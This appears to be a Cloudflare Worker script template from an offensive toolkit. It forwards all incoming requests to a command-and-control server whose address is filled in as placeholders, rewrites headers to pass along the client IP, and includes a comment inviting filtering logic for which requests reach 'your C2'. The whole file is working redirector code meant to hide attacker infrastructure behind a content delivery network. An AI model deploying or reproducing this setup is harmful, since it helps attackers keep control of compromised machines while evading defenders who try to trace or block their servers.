async function handleRequest(request) {

    /*
        HERE you can add you intelligence to rediect the request to your C2 or not based on request properties
    */


    let url = '${c2_ip}:${c2_port}'
    let initialURL = new URL(request.url)

    // Copy CF-Connecting-IP to X-Forwarded-For to abstract C2 side that we are using cloudflare
    let ip = request.headers.get("CF-Connecting-IP")

    // Recreate a new Headers object as some header values are immutable
    let alteredHeaders = new Headers()
    alteredHeaders.append('X-Forwarded-For', ip)

    // Copy values from initialHeaders to alteredHeaders
    for (let [key, value] of request.headers) {
        alteredHeaders.append(key, value)
    }

    console.log(new Map(alteredHeaders))
    
    var customInit = {
        url: url,
        headers: alteredHeaders,
    };

    console.log(customInit)

    url = new URL(initialURL.pathname, url)
    const newRequest = new Request(url, new Request(request, customInit))

    try {
        let response = await fetch(newRequest)

        let initialText = await response.text()

        return new Response(initialText, {
            status: 200,
            headers: response.headers
        })
    } catch (e) {
        return new Response(JSON.stringify({ error: e.message }), { status: 500 })
    }
}

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})
